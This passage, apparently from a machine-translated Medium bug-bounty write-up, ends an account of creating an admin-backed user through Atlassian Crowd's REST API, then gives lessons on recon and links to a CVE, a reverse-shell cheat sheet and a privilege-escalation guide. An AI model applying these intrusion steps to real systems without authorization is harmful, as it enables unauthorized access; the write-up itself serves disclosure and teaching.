translated">你的新用户在这里是指我们之前创建的用户名</li><li id="9107" class="lt lu iq kh b ki mc kl md ko me ks mf kw mg la ly lz ma mb bi translated"><strong class="kh ir">群组管理员用户名这里</strong> =指群组的管理员用户名</li><li id="5e47" class="lt lu iq kh b ki mc kl md ko me ks mf kw mg la ly lz ma mb bi translated"><strong class="kh ir">crowd _ administrator _ password _ here</strong>=表示群组的管理员密码</li></ul><p id="7d16" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">如果成功，那么我们将得到一个简单的回应:</p><pre class="lb lc ld le gt lf lg lh li aw lj bi"><span id="4531" class="lk ll iq lg b gy lm ln l lo lp">HTTP/1.1 204 No Content <br/>Server: Apache-Coyote/1.1 <br/>Redacted.</span></pre><p id="abf7" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">之后，我们将能够登录到应用程序。</p><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi oq"><img src="../Images/daddb45c1e320d673797d6971908090a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*YXnztNmPoUbEV5Lt.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图37成功登录应用程序</figcaption></figure></div><div class="ab cl mh mi hu mj" role="separator"><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm"/></div><div class="ij ik il im in"><h1 id="d2a0" class="mo ll iq bd mp mq mr ms mt mu mv mw mx jw my jx mz jz na ka nb kc nc kd nd ne bi translated">三。吸取的教训</h1><p id="e55a" class="pw-post-body-paragraph kf kg iq kh b ki nf jr kk kl ng ju kn ko nh kq kr ks ni ku kv kw nj ky kz la ij bi translated">所以，我们在这里，几乎在文章的结尾。在这一节中，我想简单回顾一下，让读者更容易理解这段简单旅程中的一些教训:</p><ul class=""><li id="c9c0" class="lt lu iq kh b ki kj kl km ko lv ks lw kw lx la ly lz ma mb bi translated">在我看来(如果我错了，请纠正我)，侦察并不总是意味着资产发现活动。在这一次，这也意味着我们试图学习API如何工作，target的开发文化，等等。</li></ul><p id="9f20" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">请记住，在回复<a class="ae lq" href="https://twitter.com/mongobug" rel="noopener ugc nofollow" target="_blank"> @Mongobug </a>的一条推文时，<a class="ae lq" href="https://twitter.com/NahamSec" rel="noopener ugc nofollow" target="_blank"> @NahamSec </a>也用非常简单的话解释了recon的一个定义:</p><blockquote class="pd pe pf"><p id="fa37" class="kf kg ls kh b ki kj jr kk kl km ju kn pg kp kq kr ph kt ku kv pi kx ky kz la ij bi translated">侦察不应仅限于寻找资产和过时的东西。它还能理解应用程序，找到不易使用的功能。为了取得成功，需要在应用程序的侦察和良好的ol黑客之间取得平衡。</p></blockquote><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi pj"><img src="../Images/ae30c6eb0566a3cefa7413d8dcc19a18.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4PoZvoBZAr37eUfBSPRdgg.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图38侦察并不总是意味着资产发现活动</figcaption></figure><ul class=""><li id="2997" class="lt lu iq kh b ki kj kl km ko lv ks lw kw lx la ly lz ma mb bi translated">永远不要扔掉你搜寻的结果(除非在正式工作中，要求你在完成工作后删除所有这些数据)。有一次，这也能对你的下一步棋有用。</li></ul><p id="2e2b" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在这种情况下，我没有在第一阶段丢弃我的狩猎结果。Alhamdulillah的好处是，这些结果可用于第二阶段，最终“生产”9000美元。</p><ul class=""><li id="4a42" class="lt lu iq kh b ki kj kl km ko lv ks lw kw lx la ly lz ma mb bi translated">请享受你的捕虫活动。也许不是每个人都同意这一点，但是，不要总是想着赏金(特别是如果你刚刚开始在这一个，从来没有一个经验)。尽量考“合法/官方”目标。总之，它可以提高你的知识，方法，以及在提供奖励的目标中寻找漏洞的任何东西。</li></ul><p id="bc4f" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我试图从不提供赏金的目标(但开启了负责任的揭露计划)那里学到很多技术(我从未面对过)。在这一点上，我能说的一件事是，那些被使用的技术并不总是我们每天面对的技术。换句话说，我们需要一个官方的“土地”(法律目标)来学习它，让我们熟悉它。</p><ul class=""><li id="cd29" class="lt lu iq kh b ki kj kl km ko lv ks lw kw lx la ly lz ma mb bi translated">试着回到基础。</li><li id="e321" class="lt lu iq kh b ki mc kl md ko me ks mf kw mg la ly lz ma mb bi translated">如果你认为有人可以轻松做到，那么试着<a class="ae lq" href="https://twitter.com/brutelogic/status/964143091635630080" rel="noopener ugc nofollow" target="_blank">看看这些来自<a class="ae lq" href="https://twitter.com/brutelogic" rel="noopener ugc nofollow" target="_blank"> @BruteLogic </a>的激励词</a>:</li></ul><blockquote class="pd pe pf"><p id="cd0b" class="kf kg ls kh b ki kj jr kk kl km ju kn pg kp kq kr ph kt ku kv pi kx ky kz la ij bi translated">“他们认为我们做事很快。但是有很多艰苦的工作，无止境的反复试验。花很多时间分析搜索引擎结果，阅读大量没有帮助的信息。他们最终看到的是表演时间。我们让它看起来很容易，但事实并非如此。”</p></blockquote><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi pk"><img src="../Images/c8b11beb9251993bf491569f9688a547.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SatDYlugfgGnmrjYdM2rQw.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图39激励词之一</figcaption></figure><ul class=""><li id="1cce" class="lt lu iq kh b ki kj kl km ko lv ks lw kw lx la ly lz ma mb bi translated">最后一条是我最喜欢的名言(说真的，这很美):</li></ul><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi pl"><img src="../Images/fee2bf61dbc9e3687cc34a0b18e08acf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Wi0jF-4ycLyKPLojgUdfhA.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图40没有人能就这样从一无所有变成精英</figcaption></figure><p id="2798" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">这些话真的激励我分享东西，即使我分享的东西并不总是好东西。但是在安拉的允许下，我得到了很多反馈，这些反馈激励我改正我的错误或改进事情。</p></div><div class="ab cl mh mi hu mj" role="separator"><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm"/></div><div class="ij ik il im in"><h1 id="f491" class="mo ll iq bd mp mq mr ms mt mu mv mw mx jw my jx mz jz na ka nb kc nc kd nd ne bi translated">四。结束的</h1><p id="6a3a" class="pw-post-body-paragraph kf kg iq kh b ki nf jr kk kl ng ju kn ko nh kq kr ks ni ku kv kw nj ky kz la ij bi translated">好吧，即使第三阶段(RCE)没有赏金，至少我可以实现我的一个梦想，那就是“进入”大牌公司的内部网络(在bug hunting / bug bounty计划中)，然后看他们的内部IP(看起来很搞笑，但是满足我)。</p><p id="6153" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">除了奖励之外，就像我说的，享受你的捕虫活动吧。</p><p id="6fdb" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">最后，我的文章到此结束。下次见，英沙拉。</p></div><div class="ab cl mh mi hu mj" role="separator"><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm"/></div><div class="ij ik il im in"><h1 id="c26d" class="mo ll iq bd mp mq mr ms mt mu mv mw mx jw my jx mz jz na ka nb kc nc kd nd ne bi translated">动词 （verb的缩写）信用</h1><ul class=""><li id="658a" class="lt lu iq kh b ki nf kl ng ko pm ks pn kw po la ly lz ma mb bi translated"><a class="ae lq" href="https://twitter.com/th3g3nt3lman" rel="noopener ugc nofollow" target="_blank"> Th3g3nt3lman </a>在Bugcrowd大学演讲:<a class="ae lq" href="https://www.youtube.com/watch?v=l0YsEk_59fQ" rel="noopener ugc nofollow" target="_blank"> Github Recon和敏感数据曝光</a>。</li><li id="b2b2" class="lt lu iq kh b ki mc kl md ko me ks mf kw mg la ly lz ma mb bi translated"><a class="ae lq" href="https://www.vulnerability-lab.com/get_content.php?id=1003" rel="noopener ugc nofollow" target="_blank">微软Yammer - oAuth旁路会话漏洞</a>作者Ateeq Khan。</li><li id="8fde" class="lt lu iq kh b ki mc kl md ko me ks mf kw mg la ly lz ma mb bi translated"><a class="ae lq" href="https://support.google.com/webmasters/answer/93710" rel="noopener ugc nofollow" target="_blank"> Blok搜索索引与‘no index’</a>-谷歌的支持。</li><li id="67f5" class="lt lu iq kh b ki mc kl md ko me ks mf kw mg la ly lz ma mb bi translated"><a class="ae lq" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11580" rel="noopener ugc nofollow" target="_blank">CVE-2019–11580</a></li><li id="a79c" class="lt lu iq kh b ki mc kl md ko me ks mf kw mg la ly lz ma mb bi translated"><a class="ae lq" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="noopener ugc nofollow" target="_blank">反壳备忘单</a> - Pentest Monkey</li><li id="8985" class="lt lu iq kh b ki mc kl md ko me ks mf kw mg la ly lz ma mb bi translated"><a class="ae lq" href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" rel="noopener ugc nofollow" target="_blank">G0 TMI 1k的基本Linux权限提升</a></li><li id="e6bf" class="lt lu iq kh b ki mc kl md ko me ks mf kw mg la ly lz ma mb bi translated"><a class="ae lq" href="https://confluence.atlassian.com/crowd/the-crowd-properties-file-98665664.html" rel="noopener ugc nofollow" target="_blank">https://confluence . atlassian . com/crowd/the-crowd-properties-file-98665664 . html</a></li><li id="17cb" class="lt lu iq kh b ki mc kl md ko me ks mf kw mg la ly lz ma mb bi translated"><a class="ae lq" href="https://community.atlassian.com/t5/Crowd-questions/Is-it-possible-to-create-users-via-REST-api/qaq-p/109667" rel="noopener ugc nofollow" target="_blank">https://community . atlassian . com/t5/Crowd-questions/Is-possible-to-create-users-via-REST-API/qaq-p/109667</a></li><li id="fbfd" class="lt lu iq kh b ki mc kl md ko me ks mf kw mg la ly lz ma mb bi translated"><a class="ae lq" href="https://confluence.atlassian.com/crowdkb/how-to-deactivate-activate-a-user-through-api-814197032.html" rel="noopener ugc nofollow" target="_blank">https://confluence . atlassian . com/crowd kb/how-to-deactivate-activate-a-user-through-API-814197032 . html</a></li></ul></div><div class="ab cl mh mi hu mj" role="separator"><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm"/></div><div class="ij ik il im in"><p id="6022" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><em class="ls">关注</em> <a class="ae lq" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="ls"> Infosec报道</em> </a> <em class="ls">获取更多此类精彩报道。</em></p><div class="pp pq gp gr pr ps"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="pt ab fo"><div class="pu ab pv cl cj pw"><h2 class="bd ir gy z fp px fr fs py fu fw ip bi translated">信息安全报道</h2><div class="pz l"><h3 class="bd b gy z fp px fr fs py fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="qa l"><p class="bd b dl z fp px fr fs py fu fw dk translated">medium.com</p></div></div><div class="qb l"><div class="qc l qd qe qf qb qg nq ps"/></div></div></a></div></div></div>    
</body>
</html>